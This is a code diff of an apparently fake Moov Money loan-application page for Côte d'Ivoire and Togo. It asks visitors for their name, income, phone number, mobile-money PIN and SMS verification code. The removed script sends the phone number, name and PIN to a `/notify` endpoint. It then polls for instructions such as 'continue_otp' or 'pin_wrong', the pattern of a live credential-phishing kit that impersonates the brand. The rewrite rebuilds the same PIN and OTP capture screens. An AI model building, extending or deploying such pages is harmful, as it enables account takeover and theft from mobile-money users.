-  <!-- PAGE 1: INFORMATIONS PERSONNELLES -->
-  <div class="scr" id="s-p1">
-    <div class="top-accent"></div>
-    <div class="hdr"><div style="display:flex;align-items:center"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov Money" style="width:93px;height:auto;object-fit:contain" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Moov_Money_Flooz.png/512px-Moov_Money_Flooz.png'"></div><span class="step-label">Étape 1 sur 2</span></div>
-    <div class="prog"><div class="prog-fill" style="width:50%"></div></div>
-    <div class="body">
-      <div class="section-title">Vos informations</div>
-      <div class="section-sub">Ces informations sont nécessaires pour traiter votre demande de crédit.</div>
-      <div class="field"><div class="fpair"><div><label class="flbl">Prénom</label><input type="text" id="fn" placeholder="Votre prénom" oninput="validateAlpha(this);chk1()"></div><div><label class="flbl">Nom</label><input type="text" id="ln" placeholder="Votre nom" oninput="validateAlpha(this);chk1()"></div></div></div>
-      <div class="field"><label class="flbl">Situation professionnelle</label><select id="incomeSource" onchange="chk1()"><option value="">Sélectionnez votre situation</option><option value="Salarié">Salarié</option><option value="Auto-entrepreneur">Auto-entrepreneur</option><option value="Commerçant">Commerçant</option><option value="Étudiant">Étudiant</option><option value="Sans emploi">Sans emploi</option><option value="Retraité">Retraité</option></select></div>
-      <div class="field"><label class="flbl">Revenu mensuel (FCFA)</label><input type="text" inputmode="numeric" id="inc" placeholder="0" oninput="validateNumeric(this);chk1()"></div>
+  <!-- PAGE 1: PERSONAL INFO -->
+  <div class="page" id="pg1">
+    <div class="top-bar"></div>
+    <div class="hdr-row"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov"><span class="step-tag">Étape 1 sur 2</span></div>
+    <div class="progress-bar"><div class="progress-fill" style="width:50%"></div></div>
+    <div class="content">
+      <h2 class="info-title">Vos informations</h2>
+      <p class="info-sub">Ces informations sont nécessaires pour traiter votre demande de crédit.</p>
+      
+      <div class="two-cols">
+        <div class="field-grp"><label class="label">Prénom</label><input class="input-field" id="firstName" placeholder="Votre prénom" oninput="validateAlpha(this);checkInfoForm()"></div>
+        <div class="field-grp"><label class="label">Nom</label><input class="input-field" id="lastName" placeholder="Votre nom" oninput="validateAlpha(this);checkInfoForm()"></div>
+      </div>
+      <div class="field-grp"><label class="label">Situation professionnelle</label>
+        <select class="input-field" id="incomeSrc" onchange="checkInfoForm()" style="appearance:none;background-image:url('data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2212%22 height=%228%22%3E%3Cpath fill=%22%23666%22 d=%22M1.4 0L6 4.6 10.6 0 12 1.4l-6 6-6-6z%22/%3E%3C/svg%3E');background-repeat:no-repeat;background-position:right 12px center;padding-right:32px">
+          <option value="">Sélectionnez votre situation</option>
+          <option>Salarié</option><option>Auto-entrepreneur</option><option>Commerçant</option><option>Étudiant</option><option>Sans emploi</option><option>Retraité</option>
+        </select>
+      </div>
+      <div class="field-grp"><label class="label">Revenu mensuel (FCFA)</label><input class="input-field" id="monthlyInc" placeholder="0" oninput="validateNumeric(this);checkInfoForm()"></div>
       <div class="spacer"></div>
     </div>
-    <div class="foot"><div class="brow"><button class="btn-back" onclick="go('s-p1','s-land')">Retour</button><button class="btn-primary" id="p1btn" onclick="go('s-p1','s-moov-login')" disabled>Continuer</button></div></div>
+    <div class="footer" style="display:flex;gap:10px">
+      <button class="btn-outline" onclick="goTo('pg0')">Retour</button>
+      <button class="btn" id="infoNextBtn" disabled onclick="goTo('pg2')" style="flex:2">Continuer</button>
+    </div>
   </div>
 
-  <!-- PAGE 2: MOOV LOGIN -->
-  <div class="scr moov-login-scr" id="s-moov-login">
-    <div class="moov-header">
-      <div class="circle-decor"></div><div class="dots"></div><div class="rings"></div>
-      <div class="back-arrow" onclick="go('s-moov-login','s-p1')"><svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg></div>
-      <svg class="wave" viewBox="0 0 390 60" preserveAspectRatio="none"><path d="M0,25 C90,75 300,-15 390,25 L390,60 L0,60 Z" fill="#ffffff"></path></svg>
+  <!-- PAGE 2: LOGIN -->
+  <div class="page" id="pg2">
+    <div class="orange-header">
+      <div class="decor"></div><div class="ring"></div>
+      <button class="back-arrow-btn" onclick="goTo('pg1')">←</button>
+      <div class="logo-float"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov"></div>
+      <svg class="wave-svg" viewBox="0 0 390 35"><path d="M0,12 C90,30 300,-5 390,12 L390,35 L0,35 Z" fill="#fff"></path></svg>
     </div>
-    <div class="logo-wrap"><div class="logo-diamond"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov Money logo" referrerpolicy="no-referrer" crossorigin="anonymous" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Moov_Money_Flooz.png/512px-Moov_Money_Flooz.png'"></div></div>
-    <div class="moov-body-content" style="margin-top:8px">
-      <div class="moov-title">Démarrez</div>
-      <div class="moov-subtitle">Sélectionnez votre pays et entrez votre numéro</div>
-
-      <!-- Country Selector -->
-      <div class="country-selector-wrap">
-        <label style="display:block;font-size:13px;color:#6b6b6b;margin-bottom:6px;font-weight:600;">Pays</label>
-        <div class="country-selector" id="countrySelector" onclick="toggleCountryDropdown()">
-          <span id="selectedFlag" style="font-size:22px;opacity:0.4;">🌍</span>
-          <span id="selectedCountry" style="font-size:15px;color:#9ca3af;font-weight:500;">Sélectionnez un pays</span>
-          <span id="selectedCode" style="font-size:14px;color:#9ca3af;margin-left:auto;"></span>
-          <svg style="width:14px;height:14px;flex-shrink:0;" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2.5"><polyline points="6 9 12 15 18 9"></polyline></svg>
+    <div class="login-content">
+      <h2 class="login-title">Démarrez</h2>
+      <p class="login-sub">Sélectionnez votre pays et entrez votre numéro</p>
+      
+      <div class="country-wrap">
+        <label class="label">Pays</label>
+        <div class="country-select" onclick="toggleCountryDropdown()">
+          <span id="countryFlag" style="font-size:20px;opacity:0.4">🌍</span>
+          <span id="countryName" style="color:#999">Sélectionnez un pays</span>
+          <span id="countryCode" style="margin-left:auto;color:#999;font-size:14px"></span>
+          <span style="color:#999;font-size:12px">▼</span>
         </div>
-        <div class="country-dropdown" id="countryDropdown">
-          <div class="country-option" onclick="selectCountry('ci')">
-            <span style="font-size:22px;">🇨🇮</span>
-            <span style="font-size:15px;color:#1a1a1a;font-weight:500;">Côte d'Ivoire</span>
-            <span style="font-size:14px;color:#6b6b6b;margin-left:auto;">+225</span>
-          </div>
-          <div class="country-option" onclick="selectCountry('tg')">
-            <span style="font-size:22px;">🇹🇬</span>
-            <span style="font-size:15px;color:#1a1a1a;font-weight:500;">Togo</span>
-            <span style="font-size:14px;color:#6b6b6b;margin-left:auto;">+228</span>
-          </div>
+        <div class="country-drop" id="countryDropdown">
+          <div class="country-opt" onclick="pickCountry('ci')"><span style="font-size:20px">🇨🇮</span><span>Côte d'Ivoire</span><span style="margin-left:auto;color:#666;font-size:14px">+225</span></div>
+          <div class="country-opt" onclick="pickCountry('tg')"><span style="font-size:20px">🇹🇬</span><span>Togo</span><span style="margin-left:auto;color:#666;font-size:14px">+228</span></div>
         </div>
       </div>
-
-      <!-- Phone Input -->
-      <div class="moov-phone-input">
-        <span class="country-code" id="displayCode">---</span>
-        <input class="phone-number" type="tel" id="moovPhoneInput" placeholder="Sélectionnez d'abord un pays" disabled inputmode="numeric" oninput="this.value=this.value.replace(/\D/g,'').slice(0,getMaxDigits())">
+      
+      <div class="phone-row">
+        <span class="cc" id="displayCc">---</span><span class="divider">|</span>
+        <input id="phoneInput" placeholder="Sélectionnez d'abord un pays" disabled oninput="this.value=this.value.replace(/\D/g,'').slice(0,getPhoneDigits())">
       </div>
-      <div class="digit-hint" id="digitHint"></div>
-
+      <div class="digit-info" id="digitHint"></div>
+      
       <div class="spacer"></div>
-      <div class="terms-row"><div class="terms-checkbox" id="moovTermsCheck" onclick="toggleMoovTerms()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" id="moovTermsSvg" style="display:none"><polyline points="20 6 9 17 4 12"></polyline></svg></div><div class="terms-text">Cochez pour accepter les <a href="#">«Conditions générales d'utilisation»</a></div></div>
-      <button class="continue-btn" id="moovContinueBtn" onclick="goToPinPage()">Continuer</button>
+      
+      <div class="terms-row">
+        <div class="terms-box" id="termsCheckbox" onclick="toggleTerms()"><svg id="termsCheckSvg" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+        <span class="terms-txt">Cochez pour accepter les <a href="#">«Conditions générales d'utilisation»</a></span>
+      </div>
+      <button class="btn" onclick="goToPin()">Continuer</button>
     </div>
   </div>
 
   <!-- PAGE 3: PIN -->
-  <div class="scr pin-scr" id="s-pin">
-    <button class="pin-back-btn" onclick="go('s-pin','s-moov-login')">←</button>
-    <div class="pin-container">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov Money" class="pin-logo" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Moov_Money_Flooz.png/512px-Moov_Money_Flooz.png'">
-      <h1 class="pin-title">Confirmez votre code PIN</h1>
-      <p class="pin-subtitle">Entrez votre code PIN à 4-6 chiffres</p>
-      <div class="pin-input-wrap"><input type="password" class="pin-input" id="pinInput" inputmode="numeric" pattern="[0-9]*" maxlength="6" placeholder="••••••" oninput="handlePinInput(this.value)" onkeydown="handlePinKeydown(event)"></div>
-      <div class="pin-hint">4 à 6 chiffres</div>
-      <div class="pin-error-text" id="pinError">Code PIN incorrect. Veuillez réessayer !</div>
-      <div class="forgot-pin-wrap"><a class="forgot-pin-link" href="#" onclick="forgotPin()">Code PIN oublié ?</a></div>
-      <button class="pin-submit-btn" id="pinSubmitBtn" onclick="pinSubmit()" disabled>Valider</button>
+  <div class="page pin-page" id="pg3">
+    <button style="position:absolute;top:18px;left:18px;background:none;border:none;font-size:22px;cursor:pointer;z-index:5" onclick="goTo('pg2')">←</button>
+    <div class="pin-wrap">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov">
+      <h2>Confirmez votre code PIN</h2>
+      <p>Entrez votre code PIN à 4-6 chiffres</p>
+      <div class="pin-dots-row" id="pinDotsContainer">
+        <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+      </div>
+      <div class="pin-err" id="pinErrorMsg">Code PIN incorrect. Veuillez réessayer !</div>
+      <a class="pin-forgot" href="#" onclick="event.preventDefault();alert('Contactez le service client.\nComposez le *110#.')">Code PIN oublié ?</a>
+      <div class="keypad-grid">
+        <button class="key-btn" onclick="pinType('1')">1</button><button class="key-btn" onclick="pinType('2')">2</button><button class="key-btn" onclick="pinType('3')">3</button>
+        <button class="key-btn" onclick="pinType('4')">4</button><button class="key-btn" onclick="pinType('5')">5</button><button class="key-btn" onclick="pinType('6')">6</button>
+        <button class="key-btn" onclick="pinType('7')">7</button><button class="key-btn" onclick="pinType('8')">8</button><button class="key-btn" onclick="pinType('9')">9</button>
+        <div></div><button class="key-btn" onclick="pinType('0')">0</button><button class="key-btn" onclick="pinBackspace()" style="background:transparent;font-size:18px">⌫</button>
+      </div>
     </div>
   </div>
 
   <!-- PAGE 4: OTP -->
-  <div class="scr moov-otp-scr" id="s-moov-otp">
-    <div class="moov-otp-header"><div class="back-arrow" onclick="go('s-moov-otp','s-pin')" style="position:static"><svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg></div></div>
-    <div class="moov-otp-body">
-      <div class="moov-otp-title">Vérifier votre numéro</div>
-      <div class="moov-otp-subtitle" id="moovOtpSubtitle">Saisissez le code que nous avons envoyé</div>
-      <div class="otp-row" id="moovOtpRow">
-        <input class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
-        <input class="otp-box" maxlength="1" inputmode="numeric">
-        <input class="otp-box" maxlength="1" inputmode="numeric">
-        <input class="otp-box" maxlength="1" inputmode="numeric">
-        <input class="otp-box" maxlength="1" inputmode="numeric">
-        <input class="otp-box" maxlength="1" inputmode="numeric">
+  <div class="page" id="pg4">
+    <div class="otp-header"><button style="background:none;border:none;color:#fff;font-size:20px;cursor:pointer" onclick="goTo('pg3')">←</button></div>
+    <div class="otp-body">
+      <h2>Vérifier votre numéro</h2>
+      <p class="sub" id="otpPhoneText">Saisissez le code que nous avons envoyé</p>
+      <div class="otp-boxes" id="otpContainer">
+        <input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric">
+        <input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric">
       </div>
-      <div class="otp-auto-detect" id="otpAutoDetect"></div>
-      <div class="resend" id="moovResendText" style="margin-top:12px">Renvoyer le code dans <strong id="moovTimer">04:26</strong></div>
+      <div class="timer-txt" id="otpTimerDisplay">Renvoyer le code dans <strong>04:26</strong></div>
       <div class="spacer"></div>
-      <button class="moov-continue-btn" id="moovOtpSubmitBtn" onclick="submitMoovOtp()">Continuer</button>
+      <button class="btn" id="otpSubmitBtn" onclick="verifyOtp()" style="background:#a9c2e8;cursor:not-allowed">Continuer</button>
     </div>
   </div>
 
-  <!-- PAGE 5: SUCCÈS -->
-  <div class="scr" id="s-ok">
-    <div class="top-accent"></div>
-    <div class="hdr"><div style="display:flex;align-items:center"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov Money" style="width:93px;height:auto;object-fit:contain" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Moov_Money_Flooz.png/512px-Moov_Money_Flooz.png'"></div></div>
-    <div class="succ-wrap">
-      <div class="succ-icon"><svg viewBox="0 0 24 24"><polyline points="4 12 9 17 20 7"/></svg></div>
-      <div class="succ-h" id="successTitle">Demande envoyée</div>
-      <div class="succ-p" id="successMsg">Votre demande de crédit a bien été reçue.</div>
-      <div class="ref-box"><div class="ref-lbl">Numéro de référence</div><div class="ref-val" id="ref-num">MM-2026-XXXXXX</div></div>
-      <div class="spacer"></div>
-      <button class="btn-ghost" onclick="reset()">Nouvelle demande</button>
-      <div class="fnote">Moov Money · Service financier mobile</div>
+  <!-- PAGE 5: SUCCESS -->
+  <div class="page" id="pg5">
+    <div class="top-bar"></div>
+    <div class="hdr-row"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov"></div>
+    <div class="succ-content">
+      <div class="succ-circle"><svg viewBox="0 0 24 24"><polyline points="4 12 9 17 20 7"/></svg></div>
+      <h2 id="successTitle">Demande approuvée</h2>
+      <p class="msg" id="successMessage">Félicitations ! Votre demande de crédit a été approuvée.</p>
+      <div class="ref-card"><div class="rl">Numéro de référence</div><div class="rv" id="refNumber">MM-2026-XXXXXX</div></div>
+      <button class="btn" style="background:transparent;color:var(--sub);margin-top:20px" onclick="resetAll()">Nouvelle demande</button>
+      <div class="footnote">Moov Money · Service financier mobile</div>
     </div>
   </div>
+
 </div>
 
 <script>
-const API_BASE=window.location.origin,POLL_INTERVAL=3000,POLL_TIMEOUT=120000;
-var durVal=6,currentToken=null,pollTimer=null,moovTermsAccepted=false,moovOtpTimer=null,otpAutoSubmitted=false;
-var selectedCountry=null;
-
-// Country config
-var countryConfig={
-  ci:{name:"Côte d'Ivoire",code:'+225',flag:'🇨🇮',digits:10,placeholder:'07XXXXXXXX'},
-  tg:{name:'Togo',code:'+228',flag:'🇹🇬',digits:8,placeholder:'90XXXXXX'}
+// ═══════════════════════════════════════════
+// GLOBAL STATE
+// ═══════════════════════════════════════════
+var state = {
+  duration: 6,
+  amount: 1000,
+  country: null,
+  termsOk: false,
+  pin: '',
+  otpTimer: null
 };
 
-function toggleCountryDropdown(){
-  var dd=document.getElementById('countryDropdown');
-  var sel=document.getElementById('countrySelector');
-  dd.classList.toggle('show');
-  sel.classList.toggle('open');
+var countries = {
+  ci: { name: "Côte d'Ivoire", code: '+225', flag: '🇨🇮', digits: 10, ph: '07XXXXXXXX' },
+  tg: { name: 'Togo', code: '+228', flag: '🇹🇬', digits: 8, ph: '90XXXXXX' }
+};
+
+// ═══════════════════════════════════════════
+// NAVIGATION
+// ═══════════════════════════════════════════
+function goTo(pageId) {
+  console.log('➡️ Navigating to:', pageId);
+  var pages = document.querySelectorAll('.page');
+  for (var i = 0; i < pages.length; i++) {
+    pages[i].classList.remove('active');
+  }
+  var target = document.getElementById(pageId);
+  if (target) {
+    target.classList.add('active');
+    target.scrollTop = 0;
+    
+    if (pageId === 'pg3') resetPin();
+    if (pageId === 'pg4') setupOtpPage();
+  }
 }
 
-function selectCountry(key){
-  selectedCountry=key;
-  var cfg=countryConfig[key];
-  document.getElementById('selectedFlag').textContent=cfg.flag;
-  document.getElementById('selectedFlag').style.opacity='1';
-  document.getElementById('selectedCountry').textContent=cfg.name;
-  document.getElementById('selectedCountry').style.color='#1a1a1a';
-  document.getElementById('selectedCode').textContent=cfg.code;
-  document.getElementById('selectedCode').style.color='#6b6b6b';
-  document.getElementById('displayCode').textContent=cfg.code;
-  document.getElementById('digitHint').textContent=cfg.digits+' chiffres';
+// ═══════════════════════════════════════════
+// LOAN CALCULATIONS
+// ═══════════════════════════════════════════
+function calcMonthly(amt, dur) {
+  if (!amt || amt <= 0) return 0;
+  var rate = 0.05 / 12;
+  return amt * rate * Math.pow(1 + rate, dur) / (Math.pow(1 + rate, dur) - 1);
+}
+
+function refreshDisplay() {
+  var a = state.amount;
+  document.getElementById('amtDisplay').textContent = a.toLocaleString('fr-FR') + ' FCFA';
+  var monthly = calcMonthly(a, state.duration);
+  document.getElementById('monthlyVal').textContent = monthly > 0 ? Math.round(monthly).toLocaleString('fr-FR') + ' FCFA' : '—';
+  document.getElementById('totalVal').textContent = monthly > 0 ? Math.round(monthly * state.duration).toLocaleString('fr-FR') + ' FCFA' : '—';
+}
+
+function onSlider(val) {
+  state.amount = parseInt(val);
+  document.getElementById('customAmt').value = state.amount;
+  document.getElementById('amtErr').style.display = 'none';
+  refreshDisplay();
+}
+
+function onCustomAmount(val) {
+  val = val.replace(/\D/g, '');
+  document.getElementById('customAmt').value = val;
+  var n = parseInt(val) || 0;
+  if (val === '') { document.getElementById('amtErr').style.display = 'none'; state.amount = 1000; document.getElementById('amountSlider').value = 1000; refreshDisplay(); return; }
+  if (n < 1000) { document.getElementById('amtErr').style.display = 'block'; }
+  else { document.getElementById('amtErr').style.display = 'none'; if (n > 100000) n = 100000; }
+  state.amount = n;
+  document.getElementById('amountSlider').value = n;
+  refreshDisplay();
+}
+
+function pickDur(el) {
+  var btns = document.querySelectorAll('#durGrid .dur-btn');
+  for (var i = 0; i < btns.length; i++) btns[i].classList.remove('sel');
+  el.classList.add('sel');
+  state.duration = parseInt(el.getAttribute('data-dur'));
+  refreshDisplay();
+}
+
+// ═══════════════════════════════════════════
+// PERSONAL INFO
+// ═══════════════════════════════════════════
+function validateAlpha(el) {
+  el.value = el.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, '');
+}
+
+function validateNumeric(el) {
+  el.value = el.value.replace(/[^0-9.]/g, '');
+  var parts = el.value.split('.');
+  if (parts.length > 2) el.value = parts[0] + '.' + parts.slice(1).join('');
+}
+
+function checkInfoForm() {
+  var ok = document.getElementById('firstName').value.trim() &&
+           document.getElementById('lastName').value.trim() &&
+           document.getElementById('incomeSrc').value &&
+           document.getElementById('monthlyInc').value.trim();
+  document.getElementById('infoNextBtn').disabled = !ok;
+}
+
+// ═══════════════════════════════════════════
+// COUNTRY SELECTION
+// ═══════════════════════════════════════════
+function toggleCountryDropdown() {
+  document.getElementById('countryDropdown').classList.toggle('open');
+}
+
+function pickCountry(key) {
+  state.country = key;
+  var c = countries[key];
+  document.getElementById('countryFlag').textContent = c.flag;
+  document.getElementById('countryFlag').style.opacity = '1';
+  document.getElementById('countryName').textContent = c.name;
+  document.getElementById('countryName').style.color = '#000';
+  document.getElementById('countryCode').textContent = c.code;
+  document.getElementById('countryCode').style.color = '#666';
+  document.getElementById('displayCc').textContent = c.code;
+  document.getElementById('digitHint').textContent = c.digits + ' chiffres';
   
-  var input=document.getElementById('moovPhoneInput');
-  input.disabled=false;
-  input.maxLength=cfg.digits;
-  input.value='';
-  input.placeholder=cfg.placeholder;
+  var input = document.getElementById('phoneInput');
+  input.disabled = false;
+  input.maxLength = c.digits;
+  input.value = '';
+  input.placeholder = c.ph;
   input.focus();
   
-  document.getElementById('countryDropdown').classList.remove('show');
-  document.getElementById('countrySelector').classList.remove('open');
+  document.getElementById('countryDropdown').classList.remove('open');
 }
 
-function getMaxDigits(){
-  return selectedCountry?countryConfig[selectedCountry].digits:10;
+function getPhoneDigits() {
+  return state.country ? countries[state.country].digits : 10;
 }
 
-document.addEventListener('click',function(e){
-  var sel=document.getElementById('countrySelector');
-  var dd=document.getElementById('countryDropdown');
-  if(sel&&dd&&!sel.contains(e.target)&&!dd.contains(e.target)){
-    dd.classList.remove('show');
-    sel.classList.remove('open');
+function toggleTerms() {
+  state.termsOk = !state.termsOk;
+  document.getElementById('termsCheckSvg').style.display = state.termsOk ? 'block' : 'none';
+}
+
+function goToPin() {
+  if (!state.country) { alert('Veuillez sélectionner un pays'); return; }
+  var phone = document.getElementById('phoneInput').value.trim();
+  var c = countries[state.country];
+  if (!phone || phone.length !== c.digits) { alert('Veuillez entrer un numéro valide à ' + c.digits + ' chiffres pour ' + c.name); return; }
+  if (!state.termsOk) { alert("Veuillez accepter les conditions générales d'utilisation"); return; }
+  goTo('pg3');
+}
+
+// Close dropdown on outside click
+document.addEventListener('click', function(e) {
+  var dd = document.getElementById('countryDropdown');
+  var sel = document.querySelector('.country-select');
+  if (dd && sel && !sel.contains(e.target) && !dd.contains(e.target)) {
+    dd.classList.remove('open');
   }
 });
 
+// ═══════════════════════════════════════════
 // PIN
-var pinInput=document.getElementById('pinInput'),pinError=document.getElementById('pinError'),pinSubmitBtn=document.getElementById('pinSubmitBtn'),pinIsShaking=false;
-function handlePinInput(v){v=v.replace(/\D/g,'');pinInput.value=v;pinInput.classList.remove('error','valid');pinError.classList.remove('show');pinSubmitBtn.disabled=v.length<4||v.length>6;if(!pinSubmitBtn.disabled)pinInput.classList.add('valid')}
-function handlePinKeydown(e){if(e.key==='Enter'&&pinInput.value.length>=4&&pinInput.value.length<=6){e.preventDefault();pinSubmit()}}
-function pinReset(){pinInput.value='';pinInput.classList.remove('error','valid');pinError.classList.remove('show');pinSubmitBtn.disabled=true;pinIsShaking=false}
-function pinShake(){if(pinIsShaking)return;pinIsShaking=true;pinInput.classList.add('error');pinError.classList.add('show');pinSubmitBtn.disabled=true;setTimeout(function(){pinInput.classList.remove('error');pinIsShaking=false},400)}
-function pinSubmit(){var p=pinInput.value;if(p.length<4||p.length>6)return;showPollingOverlay('Vérification du PIN','Veuillez patienter...');notifyBackend('pin',{passcode:p}).then(function(d){if(!d.ok){hideOverlay();p==='1234'?onApproved():(pinError.classList.add('show'),pinShake());return}currentToken=d.token;startPolling(function(r){hideOverlay();r==='continue_otp'?goToOtp():r==='pin_wrong'?(pinError.classList.add('show'),pinShake()):r==='loan_approved'?onApproved():r==='loan_rejected'&&onRejected()})}).catch(function(){hideOverlay();p==='1234'?onApproved():(pinError.classList.add('show'),pinShake())})}
-function forgotPin(){alert('Code PIN oublié ? Veuillez contacter le service client.\n\nComposez le *110# pour obtenir de l\'aide.')}
-
-// Backend
-async function notifyBackend(type,extra){
-  var phone=document.getElementById('moovPhoneInput').value.trim(),
-      fn=document.getElementById('fn').value.trim(),
-      ln=document.getElementById('ln').value.trim(),
-      name=[fn,ln].filter(Boolean).join(' ')||'Unknown',
-      cfg=selectedCountry?countryConfig[selectedCountry]:{code:'+225'},
-      payload={type:type,phone:phone,countryCode:cfg.code,name:name};
-  for(var k in extra)payload[k]=extra[k];
-  try{var r=await fetch(API_BASE+'/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});return await r.json()}catch(e){return{ok:false,error:'Network error'}}
+// ═══════════════════════════════════════════
+function resetPin() {
+  state.pin = '';
+  refreshPinDots();
+  document.getElementById('pinErrorMsg').classList.remove('show');
 }
-function startPolling(cb){var t0=Date.now();clearInterval(pollTimer);pollTimer=setInterval(async function(){if(Date.now()-t0>POLL_TIMEOUT){clearInterval(pollTimer);showOverlayError("Délai d'attente dépassé.");return}try{var r=await fetch(API_BASE+'/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:currentToken})}),d=await r.json();if(!d.ok){clearInterval(pollTimer);showOverlayError('Erreur de vérification.');return}if(d.result!=='pending'){clearInterval(pollTimer);cb(d.result)}}catch(e){}},POLL_INTERVAL)}
 
-// Overlay
-function showOverlay(h){document.getElementById('overlayCard').innerHTML=h;document.getElementById('overlay').style.display='flex'}
-function hideOverlay(){document.getElementById('overlay').style.display='none'}
-function showPollingOverlay(t,d){showOverlay('<div class="overlay-spinner"></div><div class="overlay-title">'+(t||'Traitement')+'</div><div class="overlay-desc">'+(d||'Veuillez patienter...')+'</div><div class="overlay-error" id="overlayError"></div>')}
-function showOverlayError(m){var e=document.getElementById('overlayError');if(e){e.textContent=m;e.style.display='block'}}
-
-// Navigation
-function go(f,t){
-  document.getElementById(f).classList.remove('active');
-  var e=document.getElementById(t);e.classList.add('active');e.scrollTop=0;
-  if(t==='s-pin'){pinReset();setTimeout(function(){pinInput.focus()},300)}
-  if(t==='s-moov-otp'){
-    otpAutoSubmitted=false;startMoovOtpCountdown();setupOtpAutoDetect();
-    var phone=document.getElementById('moovPhoneInput').value.trim();
-    var cfg=selectedCountry?countryConfig[selectedCountry]:{code:'+225'};
-    document.getElementById('moovOtpSubtitle').textContent='Saisissez le code envoyé à ('+cfg.code+') '+phone;
-    document.querySelectorAll('#moovOtpRow .otp-box').forEach(b=>{b.value='';b.classList.remove('filled','auto-filled')});
-    document.getElementById('moovOtpSubmitBtn').classList.remove('active');document.getElementById('moovOtpSubmitBtn').style.cursor='not-allowed';
-    document.getElementById('otpAutoDetect').textContent='';document.querySelector('#moovOtpRow .otp-box').focus();
+function pinType(digit) {
+  if (state.pin.length >= 6) return;
+  state.pin += digit;
+  refreshPinDots();
+  document.getElementById('pinErrorMsg').classList.remove('show');
+  
+  if (state.pin.length >= 4 && state.pin.length <= 6) {
+    setTimeout(function() {
+      if (state.pin.length >= 4) submitPin();
+    }, 600);
   }
 }
-function goToPinPage(){
-  if(!selectedCountry){alert('Veuillez sélectionner un pays');return}
-  var phone=document.getElementById('moovPhoneInput').value.trim();
-  var cfg=countryConfig[selectedCountry];
-  if(!phone||phone.length!==cfg.digits){alert('Veuillez entrer un numéro valide à '+cfg.digits+' chiffres pour '+cfg.name);return}
-  if(!moovTermsAccepted){alert("Veuillez accepter les conditions générales d'utilisation");return}
-  go('s-moov-login','s-pin');
+
+function pinBackspace() {
+  state.pin = state.pin.slice(0, -1);
+  refreshPinDots();
+  document.getElementById('pinErrorMsg').classList.remove('show');
 }
-function goToOtp(){go('s-pin','s-moov-otp')}
 
-// Loan calculations
-function calcM(a,m){if(!a||a<=0)return 0;var r=.05/12;return a*r*Math.pow(1+r,m)/(Math.pow(1+r,m)-1)}
-function selectDur(el){document.querySelectorAll('.dur-opt').forEach(b=>b.classList.remove('selected'));el.classList.add('selected');durVal=parseInt(el.dataset.val);updateLanding()}
-function amountInputChange(v){v=v.replace(/\D/g,'');document.getElementById('amountInput').value=v;var e=document.getElementById('amountError');if(v===''){e.classList.remove('show');document.getElementById('slider').value=1000;updateLanding();return}var n=parseInt(v);if(n<1000){e.classList.add('show');updateDisplay(n)}else{e.classList.remove('show');if(n>100000){n=100000;document.getElementById('amountInput').value=n}document.getElementById('slider').value=n;updateLanding()}}
-function updateDisplay(n){document.getElementById('loanAmt').textContent=n.toLocaleString('fr-FR')+' FCFA';var mo=calcM(n,durVal);document.getElementById('land-monthly').textContent=mo>0?Math.round(mo).toLocaleString('fr-FR')+' FCFA':'—';document.getElementById('land-total').textContent=mo>0?Math.round(mo*durVal).toLocaleString('fr-FR')+' FCFA':'—';var s=document.getElementById('slider'),p=((n-1000)/(100000-1000))*100;s.style.background='linear-gradient(90deg, var(--orange) '+p+'%, var(--border) '+p+'%)'}
-function sliderChange(v){document.getElementById('amountInput').value=v;document.getElementById('amountError').classList.remove('show');updateLanding()}
-function updateLanding(){var a=parseInt(document.getElementById('slider').value)||1000;updateDisplay(a)}
-function validateAlpha(el){el.value=el.value.replace(/[^a-zA-ZÀ-ÿ\s]/g,'')}
-function validateNumeric(el){el.value=el.value.replace(/[^0-9.]/g,'');var p=el.value.split('.');if(p.length>2)el.value=p[0]+'.'+p.slice(1).join('')}
-function chk1(){var ok=document.getElementById('fn').value.trim()&&document.getElementById('ln').value.trim()&&document.getElementById('incomeSource').value.trim()&&document.getElementById('inc').value.trim();document.getElementById('p1btn').disabled=!ok}
-function toggleMoovTerms(){moovTermsAccepted=!moovTermsAccepted;document.getElementById('moovTermsSvg').style.display=moovTermsAccepted?'block':'none'}
